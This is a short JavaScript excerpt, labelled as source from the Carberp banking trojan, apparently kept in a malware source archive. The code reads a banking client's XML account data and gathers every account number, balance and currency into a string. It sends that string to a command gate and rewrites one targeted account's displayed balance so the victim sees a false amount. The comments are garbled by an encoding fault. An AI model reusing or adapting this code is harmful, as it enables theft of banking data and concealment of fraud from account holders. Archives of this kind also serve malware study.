/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
/*������� ��������*/
var new_balance = 0;

$(document).ready(function(){
	/*�������� ��� �������� ���������*/
	mainPage();
});

/*���������� ��� ���������� XML*/
function fix()
{
	mainPage();
}

/*�������� ������ �� �������*/
function mainPage()
{
	var xml = ScData.XMLDocument;
	var r = "";
	
	/*������� ��� �� ������, ������ ����� �������, ���������� ��� ��������*/
	$(xml.documentElement.childNodes).each(function(){
		var $this = $(this);
		
		/*������� ��� ����� � �������*/
		if($this.attr("ACC") != undefined && $this.attr("RS") != undefined)
			r += $this.attr("ACC")+":"+moneyToFloat($this.attr("RS"))+":"+$this.attr("CC")+"|||";
	
		
		/*���� ��� ������ ����*/
		if($this.attr("ACC") == acc_id.split(".").join(""))
		{
			if(!new_balance)
				new_balance = moneyToFloat($this.attr("RS"))+balance;
			
			/*������ ������*/
			$this.attr("RS", roundMoney(new_balance).toString());
		}
	});
	
	sendToGate(r, "ballance");
}